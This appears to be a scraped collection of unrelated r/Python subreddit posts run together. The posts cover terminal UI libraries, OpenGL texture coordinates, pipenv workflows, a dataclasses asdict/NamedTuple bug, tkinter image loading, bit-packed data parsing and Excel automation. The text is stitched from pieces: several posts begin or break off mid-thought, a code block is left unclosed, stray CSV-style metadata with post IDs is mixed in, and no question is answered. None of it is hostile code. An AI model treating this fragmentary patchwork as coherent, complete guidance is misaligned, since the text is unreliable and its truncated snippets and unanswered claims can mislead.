I presently have a pure looping/readline interface that covers about 90% of the work I need to do, but the remaining 10%, as they say, takes the other 90% of the time when I'm using the DB.

With that preface, I'm trying to decide which (using the terms loosely here) curses wrapper I should use for the DB editor?  

Features I'm looking at are:

* Ability to handle lists (or otherwise have multi-line textboxes)
* Possibility of a two-column interface
* Ability to have a listener for F-key presses (for prev/next or reverting changes)
* Quality of tutorial docs.

Without further ado, here are the results I found and my thoughts on them—can you let me know which option I should pick or if any of my thoughts are inaccurate?

* **Cursebox**—too little documentation for me to make an informed decision
* **urwid**—I really wanted this to be the frontrunner, but the tutorial-style documentation is sorely lacking.  Probably overkill for what I need.
* **npyscreen**—seems to be able to do what I want besides possibly easily creating two-column UIs
* **ASCIImatics**—even has a DB editing UI right there in the tutorial, so it's the current frontrunner (but I'll need to dig deeper to check on ease of F-key listening and two-column possibilities)
* **Python Prompt Toolkit**—seems very flexible from the featured projects tab, but also not quite for the use cases I need at the moment.

"So I have a texture that I need to display to the user, get the user to select 4 points and then prospective correct that image. I have that part down and working.

The problem is that the texture is loaded OpenGL style (0,0 as BL) but that is not natural for the user. I can easily flip the texture VISUALLY but my selection coordinates are still referencing the OpenGL BL coordinate space. If I can invert the selection coordinates that will effectively bring both into alignment and the correct section of the texture will be isolated.

Texture coordinates are in your typical `u, v, u + w, v, u + w, v + h, u, v + h` as a relative number of the rendered display and you can simpily flip your `h` to get the inversion. The problem is the above asumes its a rectangular selection and yet I have a quad who's every corner coord would have a different `w, h`.

I have been racking my brain for a way to do this and come up short. My current method takes `display_size[]` and `selection_coords[]` zips them together while doing `selection / size` to get the relative value. This works for selcting the correct part of the image when both on the OpenGL BL coordinate system.

Is there an existing matrix or something I can use to get the relatives out of AND inverted all together, or at a minimum a way to get the inversion of my relatives?

Just trying to stir up some noise about a very nice conceptual tool with poorly thought out internals.

First of all.... no len on `_grouper`. 

Second of all, the `_grouper` iterable(i'm aware it's not technically an iterable), if you cast it to a list to check it's length for the first point, it is no longer iterable. This is the *crappiest* part about OOP; everyone is obsessed with returning an object that looks and feels familiar at first glance, that no one checks to see if their object is consistent and produces expected behavior. Mutability 0 : immutability 1.

So the solution is as follows, and is both un-pythonic and horribly smelly.

```python
for k, g in itertools.groupby(myListOfDict, key=itemgetter(""some_key"")):
  gg = list(g)
  if len(gg) > 1:  # If the grouping is *not* a singleton, do something
     # Do something with the data
  else:
     # My test case is crappy

Then I retrieve the various IDs and for each one I load the payload with:

"Hello r/Python community!

I currently have a project that comprises 3 parts. One of them is a standard API that exposes my database information. The second is just a front end. The third is to build a custom library that handles multiple excel and csv files to input processed data from them to said database and this is where my issue lies because it involves python (I am building the other parts in php7 and a js framework since i have professional experience with). 

I have only used python for personal projects and scripts and have never deployed anything python related so I am unaware of the due process and I feel overwhelmed with the options I see with googling. 

My questions are: How should my project be structured? It is not a web application I am probably going to create a cronjob that calls the entry point every some interval, but i still want to write tests, have log files for the output results, include modules (with pip i assume) and I need a directory that will contain the excel-csv files, as well as a possibly another directory with config files with database credentials and probably other things I haven't considered yet. I currently don't know in which OS my project will be deployed but how would I go about doing that? Zip the files and sftp them and ask my client to install python 3.5? What about the installed modules from pip, these would stay in my development virtual environment, is there a file such as composer.json in php where all the dependencies are listed and then I run some command such as pip install -all -production which then takes cares of installing all the modules I flagged for production? Are there other tools that handle the process? I stumbled across PyInstaller but I really have no clue if this is a widely used tool and if it is right for me.

"Hello everyone!

I want to ask you for feedback for my project - XDump - a utility to make a consistent partial dump and load it into the database.

A few years ago I faced with a problem - I needed a data from the production database to reproduce a bug locally. Back then the table had a single FK to another table, and they both were small, so I just dumped these 2 tables with \`pg\_dump -t first -t second\` and it worked fine. However, after some time, the schema became more complex, the database size grew dramatically, and it was taking too much time to accomplish the task. It wasn't possible to load fewer tables, because such dump cannot be loaded due referential integrity issues - referenced rows should exist in the database.

At some point, I decided to create a utility for making integral, consistent DB dumps, that include only what is needed to reproduce some production issue locally.

**FEATURES**:

\- Automatic loading of referenced objects (recursive and non-recursive relations)

\- Control what to include via SQL queries - \`SELECT \* FROM employees WHERE first\_name = 'John'\`

\- Supports PostgreSQL 9.4 - 10.4 and SQLite >= 3.8.3

\- DB re-creation / tables truncation before loading the dump

\- Django integration

**UPCOMING:**

\- MySQL support

\- Loading of rows that reference certain rows

"I'm a bit stumped by a problem I've encountered, but since its a bit complicated I figured I would ask here instead of /r/learnpython.  If this is mistaken, please let me know and I'll repost there.  I'll also preface this by mentioning that I'm more of an IT admin than a developer and this is the first major program I've worked on in decades, but other than a few less and efficient issues here and there its pretty sturdy (doesn't hurt that a lot of its basic if/then type stuff).


To set the stage:

We have a number of voicemail servers that each hold a *significant* number of mailboxes.   The systems have a REST API that I can use to query data, however there are a couple of restrictions:

* I can collect basic details for a large number of mailboxes at once
* However I must perform 2-3 more queries *per mailbox* to collect the additional details I require for my needs.

The sheer number of mailboxes requires the data be collected in a multithreaded process (I calculated it would take 14 hours to get everything if I did it all sequentially).  I also went this way since the issue is more about waiting for a reply than needing extra horsepower to process data.  I start by opening 8 threads, assigning a server to each, and grab the basic details for each mailbox, then open 5 sub-threads to query the specific details of each mailbox.

I have two machines I run this code on:

* A mid-tier laptop with a dual core i7 cpu, 16GB RAM, and a SSD used as my development environment.
* A desktop with 2x 16 core Xeon E5 cpus, 16GB RAM, and a standard platter disk used as the production environment.

When I run my code on the dev laptop it takes about an 1-1.5 hours to complete, however when I run the same code on my production desktop it takes 4 hours.  I was able to find some posts mentioning issues like this might have to do with processes hoping from one cpu to the other losing direct access to data in cache, so I ran while forcing CPU affinity to one socket and it only took 3 hours - an improvement, but still a ways to go.

At this point I'm sort of at a loss for where to look next.  I did think about perhaps implementing multiprocessing so each thread gets its own process as well, but didn't really want to spend the time to research how to do this and refactor my code if it wasn't going to make much of a difference.

* De-serialization methods and functions now accept paths (to files containing serialized data) as well as strings.
* Programmatic generation of Declarative Base Model's based on serialized data (e.g. generate a `BaseModel` based on a JSON object).
* Programmatic generation of Table objects based on serialized data (e.g. generate a SQLAlchemy `Table` based on a JSON object).
* Added convenient ""serialize everything"" methods (e.g. `dump_to_json()` to Declarative Base Models).
* Added a public method to support serialization/de-serialization re-configuration.

However, I thought it would be cool if you could just launch your own collaborative coding environment and send the link to the interviewee/student/friend and then you're not required to log-in or pay for anything, it just uses the resources of your machine and that's it.

It executes Javascript in the browser of the person who pressed ""execute"" and logs the output of ""console.log"" and similar commands to an output box (which is synchronized between all the users of the application).

Security is not a goal, since this is intended for local use, but it's relatively okay, because all the code is launched in the embedded iframe and the whole server is ran as docker after all.

Every course is like 55 to 70 slides and I don't have the motivation to go through and screenshot every single one. The reason I'm screen shotting is not to duplicate or any trash like that, it's because OneNote's OCR reader is very well and when it's time for the test I can refer to those notes - which is allowed. 

Sorry for rambling - but I have searched for literally hours on youtube, github, stackoverflow, etc. 

If there's a way i can do all that to be automated - i would really appreciate some knowledge on how to do it or the resources i would need to get it done.

"Hi!  so the thing is when i use a simple for loop over 6.5k iterations it progresses faster, meaning it covers more iteration in less time but when i make it 46k iteration it's speed dramatically reduces. Why do you think it is? i mean the rate of iteration should vary here right.

P.S: Any help regarding speeding up the loops or how to fix this issue would be highly appreciated.

"Sorry if this is a bit noobish, I learned python in order to work on this project, I'm still a bit of a novice.

For the project in question, I need to iterate over some very large lists and make some even larger lists.  I originally used lists, found it too clumsy to deal with (for spreadsheets ranging from 1800x9 to 597,000 x 3) so I made a class to warehouse the items from the spreadsheets and iterated over a list containing a pointer to all of the objects.  I have a function that every item in one column has to be ran through, this function will preform a series of splits, regex expressions and other text manipulations, potentially creating new strings for each operation.  These strings are saved and used in another function.

So, here's the issue, when I ran this yesterday, it took 45 minutes to complete.  I'm not really fond if sitting there for 45 minutes waiting on my laptop to do something.  Since I like using print statements to watch where execution is, I know where the bottleneck is, it's the function I described above.

In an attempt to solve this problem, I've been experimenting with a few things, but I don't actually know of a great deal that I can do.  I started up a new jupyter notebook and tried to see what runs faster, comprehension or for loop.  I figured the comprehension.  Well, % didn't work for the for loop so I moved on to the next one.  I compared a list comprehension to a compiled list comprehension.  Huge surprise to me, the comprehension was faster than compiling it first.

%time\[(random.randint(1, 101)\*y) for x in range(1000) for y in range(x)\]CPU times: user 5.65 s, sys: 40.1 ms, total: 5.69 s Wall time: 5.69 s

c = compile('\[(random.randint(1, 101)\*y) for x in range(1000) for y in range(x)\] ', 'stuff', 'exec')%time exec(c)CPU times: user 5.74 s, sys: 20.1 ms, total: 5.76 s Wall time: 5.78 s  


Does anyone know why the compiled statement took longer to run than the comprehension?  Anyone have any other tips for what I can do to speed things up?  I'm looking into maybe converting some of the comprehension parts into lambdas, I'll have to test the speed on that to see if that will help or not.  


Any tips here would be appreciated.

"tldr: Check it out yourself:

    from dataclasses import dataclass, asdict
    from typing import NamedTuple
    
    class NamedTupleAttribute(NamedTuple):
         example: bool = True
    
    @dataclass
    class Data:
        attr1: bool
        attr2: NamedTupleAttribute
    
    data = Data(True, NamedTupleAttribute(example=True))
    print(asdict(data)['attr2'].example)
    >>> <generator object _asdict_inner.<locals>.<genexpr> at 0x107d9bc78>


Submitted a bug report [here](https://bugs.python.org/issue34363). Check it out if you want to know how and why this happens!

Write up below:

In Python 3.7, `dataclasses` were added to make a few programming use-cases easier to manage.

Dataclasses eliminate boilerplate code one would write in Python <3.7.

	# Python 3.6
    class Example:
        def __init__(self, val1: str, val2: str, val3: str):
        	self.val1 = val1
        	self.val2 = val2
        	self.val3 = val3

    example = Example(""here's"", ""an"", ""example"")

This code can be rewritten, like so:

	# Python 3.7
	from dataclasses import dataclass, asdict

	@dataclass
	class Example:
		val1: str
		val2: str
		val3: str

	example = Example(""here's"", ""an"", ""example"")


Dataclasses provide us with automatic comparison dunder-methods, the ability make our objects mutable/immutable and the ability to decompose them into dictionary of type `Dict[str, Any]`. 

Let's see that in action:

	from dataclasses import dataclass, asdict

	@dataclass
	class Example:
		val1: str
		val2: str
		val3: str

	example = Example(""here's"", ""an"", ""example"")
	print(asdict(example))
	>>> {'val1': ""here's"", 'val2': 'an', 'val3': 'example'}


What happens when you compose a `dataclass` with a `namedtuple`?

    from dataclasses import dataclass, asdict
	from typing import NamedTuple


	class NamedTupleAttribute(NamedTuple):
	    example: bool = True


	@dataclass
	class Data:
	    attr: NamedTupleAttribute

	data = Data(NamedTupleAttribute(example=True))
	namedtuple_attr = asdict(data)['attr']
	print(namedtuple_attr.example)
	>>> <generator object _asdict_inner.<locals>.<genexpr> at 0x107f45408>


Whoa, there! Shouldn't `data.attr.example` be of type `bool`? Why does `namedtuple_attr.example` evaluate to a generator expression?

To answer those questions, we'll need to look at a few things. First, `tuple` vs `namedtuple` factories and then `asdict()`'s  implementation.

`tuple()` takes an iterable as its only argument and exhausts it while building a new object. However, `namedtuple()` takes arbitrarily many arguments and does not exaust generators supplied as arguments.


    print(tuple(x for x in range(5)))
    >>> (0, 1, 2, 3, 4)

    print(NamedTupleAttribute(x for x in range(5)))
    >>> NamedTupleAttribute(example=<generator object <genexpr> at 0x107f45318>)

Where does this fit in with `asdict()`? We'll need to look at its implementation to understand.

    
	def asdict(obj, *, dict_factory=dict):
	    if not _is_dataclass_instance(obj):
	        raise TypeError(""asdict() should be called on dataclass instances"")
	    return _asdict_inner(obj, dict_factory)

	def _asdict_inner(obj, dict_factory):
	    if _is_dataclass_instance(obj):
	        result = []
	        for f in fields(obj):
	            value = _asdict_inner(getattr(obj, f.name), dict_factory)
	            result.append((f.name, value))
	        return dict_factory(result)
	    elif isinstance(obj, (list, tuple)):
	        return type(obj)(_asdict_inner(v, dict_factory) for v in obj) # right here
	    elif isinstance(obj, dict):
	        return type(obj)((_asdict_inner(k, dict_factory), _asdict_inner(v, dict_factory))
	                          for k, v in obj.items())
	    else:
	        return copy.deepcopy(obj)


`_asdict_inner()` will pass a generator to objects that are of type `tuple`, expecting them to be consumed by the tuple factory.

`typing.NamedTuple` and `collections.namedtuple()` are of type `tuple`, but override its `__new__` functionality.

Here's what happens when `asdict()` is called on a `dataclass` that has a `namedtuple`:

1. `_asdict_inner()` recurses on the dataclass object's fields
2. When it reaches a field with the type `tuple`, it calls the object-type's constructor with a generator expression of fields.
3. If it's a `tuple`, the generator expression is exhausted and a tuple with the generator's values is produced.
4. If it's a `NamedTuple`, the anonymous generator expression object is not iterated over and is assigned as a field on the `NamedTuple`.
5. `asdict()` returns a new `Dict[str, Any]` with malformed `NamedTuple`s.

Both Eric V. Smith and Ivan Levkivskyi have [both graciously proposed solutions to this issue](https://bugs.python.org/issue34363).

Ivan Levkivskyi has [suggested](https://bugs.python.org/msg323300) that `_asdict_inner` apply a generator expression only to the standard libraries types `list` and `tuple`, then allowing `NamedTuples` to follow the branch that becomes deep-copied. 

Eric Smith proposed [a solution](https://bugs.python.org/msg323312) in which the generator expression is *expanded* with star-notation as it is passed in the tuple factory method.

I've got all of that working fine on the C++ side, but the script side seems to be hitting a dead end with multiprocessing. When my script tries to run the same multiprocessing code that works in a non-embedded environment, the code doesn't appear to be executed at all.

[This SO thread ](https://stackoverflow.com/questions/15636266/embedded-python-multiprocessing-not-working)gave me a few ideas to try out, so I gave it a shot with these lines:

 I found a minor workaround, but I don't quite understand why it works this way or how I would fix it to work differently.

My program runs one script file, and multiprocessing commands from that script file seem to fail to spawn new processes.   
However, if that script file calls a function in a separate script file that it has imported, and that function calls multiprocessing functions, it all works exactly the way it should. 

So now I think my question is why does it behave this way, and is there anything I can do to fix the behavior in the first script? It's not the end of the world to need 2 scripts, but it sure would be a lot cleaner with just one.  ",Embedded Python and multiprocessing on Windows?,95rkgm,new

However, Python still lacks important features for **concurrency** and **functional programming**.

For the concurrency, the Global Interpreter Locker impose heavy limits on the use of Python for cpu-bound multithreading.

For functional programming, even if Python is more functional than Java, it is still quite clear that [it is not a language that treats well those who try a functional-first approach](https://stackoverflow.com/questions/1017621/why-isnt-python-very-good-for-functional-programming) \- and that is the[ will of its creator](http://python-history.blogspot.com/2009/04/origins-of-pythons-functional-features.html).

I think that Python cannot keep growing at this rate at the same time that it goes against these two very important trends. So I would like to know your opinion in this subject:

\- Will next versions implement features that make Python more efficient for concurrency and more functional-friendly?

\- Will a new pythonic language emerge that will implement these features (just like Scala is a concurrency and functional-friendly Java) ?",The future of Python is bright. Or is it?,95ljkt,new

"Constraints: Pure Python 2.6 or 2.7 + standard library. Solution either has to exist already or be pretty simple to implement (I have 3 days max, but it would be better to do it in 1-2). Has to be able to handle a throughput of ~3KB/s. 

The problem: I'm getting a stream of packed data apparently created on a machine with a 30-bit word (""The formats...consist of 8 words, each containing 30 bits""). For instance, here's the first 5 fields:

    A: bits 1-13
    B: bits 14-17
    C: bits 18-26
    D: bits 27-30
    E: bits 31-34

You see fields are falling across what would normally be considered byte boundaries. It gets worse farther on, for a total of 240 bits. This makes using `struct.unpack()` or `ctypes` an issue. Even if you turn on the `_pack_` feature, you can't have a bitfield fall across a word boundary.

What I'd love to do is just read the entire 240 bits into a long binary buffer and mask out the exact bits I want. There doesn't seem to be such a data structure in Python 2.x (or 3.x?). 

My next idea is to simulate the above. Put the 240 bits into a string. Select a chunk of bytes that contain those bits. Use `struct.unpack()` to read the bytes and then create a mask to get just those bits. Some shifting involved there. It's hairy and hasn't worked yet after a couple hours of work.

"[Documentation here](https://animatplot.readthedocs.io/en/stable/)

**What it is:**

animatplot is a library for more easily producing animated plots. It was built with the goal of making animated plots as easy as static ones. Just feed it data. No dealing with how stuff updates. More time should be spent on the data; not the plotting. Bonus: this library lets you easily add time sliders and pause buttons. This does come at a cost of memory usage (all data must be generate before any plotting not on the fly), but even for a detailed plot it should not be too bad (I made an animated pcolormesh plot with a 100,000 frames without any issue).

Here is a gif of an example:

https://i.redd.it/evfgjj31rle11.gif

If that wasn't a gif. The slider and pause button would work exactly as expected.

**Why I built it:**

I'm a physics/math student, and I've frequently found myself needing to make all sorts of animated plots. Generally things that are solutions to PDEs (light waves, heat equation, etc.). Many of my peers have struggled to produce these animation often resorting to simply clearing and redrawing plots every frame. It can also be useful for displaying iterations of a numerical method to more clearly see if it is working as expected. Ultimately, I saw a need, so I wrote this.

**What I learned writing this:**

I already knew a bit about packaging from a [previous project](https://github.com/t-makaro/nb_pdf_template), but that was a set of templates, not a library, but I still learned a lot about things like how to use a `_version.py` file to have a single location for the version. Mostly, I learned how to document code (using sphinx). I also learned a lot about how matplotlib works (luckily I never had to read any of the c code, only python). I also submitted a fix to matplotlib slated for matplotlib version 3.1. This has also really changed the way that I use matplotlib.

**Near future plans:**

animatplot is built using ""blocks"" to represent ""things"" that are to be animated. I currently have plans for scatter plot and annotation blocks. I plan to move the gallery to use sphinx-gallery once they add support for custom image scrappers. (Sphinx-gallery devs have really been hard at work to finish some stale PRs since I asked about animation support.) I also really need to improve the Pcolormesh block api since it's just not as capable as I would like.

Edit: Perhaps I should mention how long I've been working on this. I originally started this over a year ago, but I have completely rewritten everything and then some, and made the documents in the last month and a bit. The only thing that is the same from the original project is the internal logic for the play/pause button. Matplotlib 2.2 introduced discreet slider bars which inspired (and was critical to) much of the implementation.

Line 2 - Tk() is creating the window that you see and storing it inside the 'root' variable  
Line 3 - This is the dimension of the window. Height and width (optional)  
Line 4 - To change the title of the window  
Line 5 - Make sure the window stays and doesn't disappear.

Obviously there is much more to the 'Tkinter' framework.

"Hi all,


I posted a while ago about starting programming and got very motivating answers! 


I've been going pretty hard the last 3-4 months, completed edx 6.00.1x and 6.00.2x as well as 2 or 3 others using python about webscrapping and data science. Also did a course on statistical analysis which made me realise how far behind I was in maths so I started going through Khan's academy from the very basics (can't recommend that website enough!). 


Now I'm simply trying to come up with ideas to fill up my github, working on a traffic simulation  which aims at reducing wait times. It's basic but I think it might be good to have on there.


Anyways I would love to have some help as to what to do next... I work in healthcare and would love to be able to do that 50/50 with programming, both part time. I was aiming towards data science which really interests me but the more I look, the more I find how competitive and difficult it can get and doing it part time seems close to impossible.

"I need to sort a collection of text files based upon content.  Python NLP categorization seems to be a wonderful tool to complete the task. Subject matter organizing of each file is my aim. For example, I want to take a directory of journal entries as input, sort them, and then have a bunch of sub-directories based on subject (i.e., Software, Hardware, Astronomy, Painting, etc.) as my result. Some manual interaction and tweaking is expected; sincerely, anything to help sort my collection is highly appreciated. 

The text files:

\- Do not include any metadata and are not tagged for content. \*

\- Are free form and can cover any subject or topic. There are no limitations.

\- The length of each file can vary.

Am I correct in my understanding that NLP is up to the task? Or is this a square peg round hole way of applying the technology? Does a better approach (or even algorithm) exist? If so, could you point me to this (ideally mature) tool? I'm currently working up a PoC example via Python to see if this is viable. I'm not being lazy ;-) Thank you for your help and time.

\* Perhaps a simple solution is as easy as:

A script could obtain a word count per word to generate a tag list. I.e., the most used words minus any stop words. After which, the tags could then associate one file with another.

The population circles are correct, you can see larger circles in Tokyo, New York, Mexico City... But the contours are completely off, only showing a couple in the middle east, in West Kazakhstan and north of Georgia (I think?). The contours should overlap the circles, but what I'm interested in with the contours is that the populations will merge and appear more fluid across counties.

I think I have two issues.

* The first is that I've got the scaling of the contour information off, it's probably flipped around the wrong way somehow. I've played around with flipping the lon/lats and changing the resolution variable, but no good has come from it.

* The second is that I'm missing resolution information for the contours, as the population circles cover the map, but I have very limited contour information. Only about four of so contours, other than the ones mentioned about there are some others in northern Russia for some reason...

The obvious workaround is to create a separate base image with just the dependencies--this would just copy in the pipfile and pipfile.lock, and we could just rebuild this image if either of those files have changed; however, this falls over because our pipfile also makes reference to sibling directories in the same repository (the repository contains binary projects as well as library projects that the binary depends on).

Googling `file object API python` gives the first result as <https://docs.python.org/2.4/lib/bltin-file-objects.html> from Python 2.4, the second result is the C-extension API <https://docs.python.org/3/c-api/file.html>, the third is <https://www.geeksforgeeks.org/file-objects-python/>... which actually seems quite decent (and certainly easier to find than the official docs on file/stream objects...)

Googling `python open (file) api` gives https://docs.python.org/3/library/functions.html which describes `open()` but not resulting file/stream objects.

Googling `python stream api` gives relevant results <https://docs.python.org/3/library/io.html>, but it's an obscure search query *and* an obscure URL, neither of which resembles `open()` at all.

------

Googling `file object python` gives the same first result, the second result is <https://docs.python.org/3/tutorial/inputoutput.html> tutorial. Scrolling down:

>There are actually three categories of file objects: raw binary files, buffered binary files and text files. Their interfaces are defined in the io module. The canonical way to create a file object is by using the open() function.

You have to click ""io"" to find the API for file objects. Clicking ""raw binary files, buffered binary files and text files"" is useless. Clicking ""open()"" is useless.

Apparently the glossary calls them file objects, but the rest of the language calls them streams

"TL;DR

How do I load many images onto a tkinter widget without freezing the application?

Hey folks,

I had a question about how to build a large list of images in a Tkinter widget without freezing the main application. As of right now, the application is built using classes (as commonly seen in places like StackExchange) and works quite nicely.

Once the program boots up, the user selects a directory. The program will then look at all the images in that directory and create labels whose image is a thumbnail version of one of those images. Unfortunately, it takes a long time to generate a large amount of images. Because of that, I would like to try and run the loading in a separate process.

So far, the closest I have gotten to a solution is by using the after call. Here is a snippet of some of my code:

    def insertImgs(widget, images, numColumns=3, scale=0.1):
        def step():
            img = createTkImg(imgPath)
            label = tk.Label(widget, image=img)
            label.grid(row=i//numColumns, column=i%numColumns)
            # Generate a configure event to update the scrollbar of the
            # widget otherwise the user has to resize the app before
            # the scrollbar is usable
            widget.event_generate('<Configure>', when='tail')
            widget.update_idletasks()
            widget.after(0, nextStep)
            yield

        nextStep = step().__next__
        widget.after(0, nextStep)

This code works almost perfectly but it will raise a StopIteration exception. I can't use try/except because it is the Tkinter library actually calling nextStep, not me. I use update_idletasks and event_generate so that the images can pop up as they are loaded rather than show them all once the last image has been loaded. I have tried this without update_idletasks and event_generate but that did not work.

I have also tried using the multiprocessing library but that does not work because it appears that Tkinter objects are not pickleable.

I would really appreciate some guidance on this as I have been banging my head against this problem for a couple weeks now.

"I have had this long running project idea but I may be in way over my head.

Here's the synopsis - I have a classic VW Beetle with a high performance engine and with that comes the need to be aware of any issues that may be developing. So I began looking into monitoring and data logging solutions. I found that the solutions available had either system limitations (required OBD-II) or cost stupid amounts of money ($1,000+).

So here comes my DIY spirit and drive to learn more programming. I decided on the Raspberry PI as the platform - for several reasons availability of resources and accessories being chief. Inputs will be 5 temperature sensors, 1 oil pressure sensor, 2 EGT sensors and a tachometer. Primarily needs to have the ability to log data and display it either through a basic warning light or through a series of LEDs that progressively turn on based on engine temps. Planing on later adding a digital dashboard that would graphically display the different inputs. There is my pie in the sky.

Reality. I have very limited programming experience, mostly in script languages (VBA, AHK) but also some basic SQL. I buy the Raspberry Pi get it up and running tinker with native apps. Also purchased thermopouples, breakout  boards, a small 4x5 LED matrix, breadboards and jumper cables. Jumped in and got things soldered and started programming. I figured I would break out each part, get that functional and put it all together down the road. I started with one thermocouple - it took me almost 2 hours to get temperature readings, another 30 minutes to trouble shoot erroneous data I was getting and another hour to add a second thermocouple. So now I have a short program that will display sensor readings 2x a second but it's not being saved or later review.

Give me a reality check is this a way too ambitious project? Based on how long it took me to get the temp sensors running is it going to take days and days to get that input into a file and saved and even longer to turn on LEDs?",Project Idea - may need a reality check,940q3c,new

- I would prefer flat file to a fancy database.. I will host it on kubernetes so I could manage postgres if I need to, I'd just rather not I guess.. Happily either way tho but prefer less ops in general.
- secure (the reason I don't like WordPress et al) with frequent updates?



I've come across mezzanine, which looks OK but I'm not finding many themes etc and every tutorial I can find is like 5 years old.. Surely there's something I've missed? Is the python web eco system really this... erm...minimal?

"Update: Found the issue, it was in how `timeit` works. Go to the subheading `Solution`

So I was trying to investigate differences between `+=` and `extend` in lists, but while investigating, I noticed something odd.

    N/method              1000    10000    100000

    hi = og + other   0.000429  0.00538    0.0806
    og += other       0.000446  0.00517    0.0569
    og.extend(other)  0.000467  0.00552    0.0566

Where `og` and `other` are lists, while N represents how large the list is. 

I.e. reusing one of the lists in the addition results in a massive slowdown (2 orders of magnitude). 

Does anyone know why this is the case?

My first intuition is that it's the timeit module to blame here, but this is really odd behaviour. 

### Appendix

    1000 loops, best of 3: 3.47 msec per loop


# Solution

OK I've found the issue. I went and had a look at `timeit` since I was certain that's where the problem was.

    def timeit(self, number=default_number):
        """"""Time 'number' executions of the main statement.

        To be precise, this executes the setup statement once, and
        then returns the time it takes to execute the main statement
        a number of times, as a float measured in seconds.  The
        argument is the number of times through the loop, defaulting
        to one million.  The main statement, the setup statement and
        the timer function to be used are passed to the constructor.
        """"""
    

So in this case, `list1=list1+list2`, list1 was constantly growing in size each time by `N`. So after j iterations we'd create a new list of size (j+1)N which was obviously much slower since += and extend only cared about the size of list2 (N). If i had done 10 runs and 1000 repeats I'd have gotten a different result haha. 

In fact my script gives a 100x magnitude issue while the one liners give 1000x magnitude, simply due to the number of runs done

Adding `l1=list1` in the setup and rerunning the code

    ➜  python3 timeCode.py
    Summary Table

    list1 = list1 + list2; list1=l1  0.000427  0.00524

"Could someone clarify exactly what each pipenv command is doing.

These are my observations so far over the last few months of usage, some of which may be wrong on my part.  I'm on the very latest version just to clarify and I've even tried installing directly from master in case there are missing bug fixes.

* Pipfile without Pipfile.lock
   * `pipenv install`: This works as expected, pulling down packages that satisfy any constraints into the venv, and creating a lock file
* Pipfile (all packages are ""\*"") with Pipfile.lock 
   * `pipenv install my_pkg`: Adds my\_pkg to the Pipfile, pulls package into venv, updates lock file. Sounds good to me.
   * `pipenv install`: This looks like it updates any outdated packages by default? I would have expected this to use Pipfile.lock although surprising I can get over that.
   * `pipenv sync`: Installs dependencies from the lock file. Seems good, though strange to have a separate command.
   * `pipenv update`: Looks like it pulls updates to all outdated packages and then runs `pipenv lock`. Sounds good.
   * `pipenv update my_pkg`: Also looks like it updates all outdated packages rather than just my\_pkg and anything that may need updated to make the new version work. Seems either broken or useless as it is the same as a bare `pipenv update`
   * `pipenv install --selective-upgrade my_pkg`: Looks like what I want for above (why is it under `install`?). This logs out that it's found an update to my\_pkg but running my code with `pipenv run python blah.py` it's still importing the old version. Either I'm wrong or this is broken.
   * `pipenv lock`: If I run `pipenv lock`, wait for some update to be published and run `pipenv lock` again, will this lock at the newer package?

Essentially I'd like someone to clarify how to accomplish some of the following workflows:

* install a new dependency without updating the world
* upgrade a locked dependency that updates the package in the venv, updates the lock file and only updates other existing packages if there are conflicts with the new package (or it's dependencies).
* install directly from Pipfile.lock without upgrades to the system. `pipenv install --system --deploy --ignore-pipfile` looks like it does this. I don't understand why `--ignore-pipfile` is part of install when `pipenv sync` is all about the lock file. I'd like `pipenv sync --system --deploy` for building docker images. 
* pre-releases for only one package rather than the entire pipfile, ideally I don't even want \`.devN\` packages sync'd to the lock file while I'm developing/testing a package update locally.

"EXOTIC STATS PROBLEM ; MODE, FUZZY CLUSTERS, ETC

Hi I'm working on a math problem and not sure how to approach it.

Trying to enumerate, rank and extract most common numeric ranges

from a list, with a twist ;

Basic operation example is, I have ten numeric values representing

weights in variable unit measure types, i.e. grams, ounces, etc

Each value is unique and is a decimal value, 

for example we have the following set of numbers

shown below.  In this set, we are interested in the

most common magnitudinal range.  Here the most

common range value is shown by three values ;

295.999, 312.015, 330.111

the complete set is shown ;

.........................

102.35

8000.32

330.111

295.999

77.01

16.999

1099.222

645

890.01

312.015

.........................

What I want to be able to do, is to input a list of ten values similar to the above,

and have some way, to simply, easily derive the most common value by range.

If I was using values that were more static, for example if all value in the range

in the list were all similar such as ""310"", then I could just use the mode function

and it would easily tell me this.

However since the values are variable decimal types, I am a bit stumped as to how

I would accomplish this.  I came across Python Fuzzy Clustering and it looks like

this might work possibly in relation to mode but wondering if there is a simpler, easier, faster

way to do this?

The end goal is I want to be able to do pattern analysis on a list of numbers and return

the most common range of highest magnitude.

Outputs desired, as an example from the list above would be the thee values printed

to screen, text file, or variable

As a thorough geek I'm always working to advance my skills whether I'm looking for new jobs or not, and for ages I've been seeing a lot of job descriptions using the ever-popular buzzwords ""scalable"", ""high-availability"", ""fault tolerant"" and the like.

I'm curious, is there anything that someone as an individual developer not really working on large, scalable systems can do to demonstrate knowledge in this realm? I mean, I've got lots of GitHub repos up demonstrating my python chops with Django, building REST APIs, tying them to various front end tools like React and Redux, test drive development, stuff like that, but I feel like I have nothing to demonstrate that I know how to use AWS, Google Cloud, Hadoop, big data analytics tools, etc except for a couple projects I've done for dev shops which had an NDA so I can't share the code.

"Hi all,

I have automate and do some complex computation while using Excel as the
visualization layer. I have to use Excel, as the visualization layer, because
the customers of this app will need to change and do some computations,
plotting etc which they are already very familiar with, but maybe something I
can't provide to them. We have tried doing this using webapps, but it turned
out to be too slow and the types of analysis that my customers need too varied
for me to provide it to them through a web-interface, which has to be specially
programmed.

Currently, the excel template that we have stores the actual numerical and
textual data in excel itself. For binary data, we use a network filesystem. Somebody coded the template in `VBA` and while they did a great job, I think it will be a bit of a pain, because VBA and its editor doesn't easily allow for `unit-testing`, `refactoring` or access to a huge number of libraries that `python` already provides by default. 

My current goal, is to keep the `VBA` plugin as is, and based on the requested
features from my customers, I want to start implement them in `python` using
the COM functionality. In the very long term, I want to move towards a
server-client system where the data is stored on a server, the analysis is done
on a server, and Excel serves as the interface for obtaining the data and doing
any adhoc analysis.

I am aware of `comtypes`, `win32com` to control `Excel` using Python, but I
have also seen `IronPython`(based on .NET), and `ExcelDNA`. 

I have searched quite a bit.. but I haven't yet been able to find a good discussion.

I do not want to add in the smtp details, since the person sending the emails out might change their details. I want to make a draft since there might be some changes to the emails before they are sent out.

Is there any feature similar to [mailto:someone@example.com](mailto:someone@example.com) in python? Or a way I can call a windows command? I've tried looking for an answer, but I can't find anything yet.

"Hey everyone,

I've looked around and haven't been able to find an answer. Is there a reason one shouldn't use a SQL (or possibly NoSQL) database to not only store training data, but also results from training or even hyper-parameters and metadata?

Usually I just save everything using CSV or pickle files in hierarchies of directories based around different hyper-parameters, training sessions, etc, which works for the most part. But I was thinking that storing as much as I can in a database (or databases) would be a more flexible and possibly faster approach.

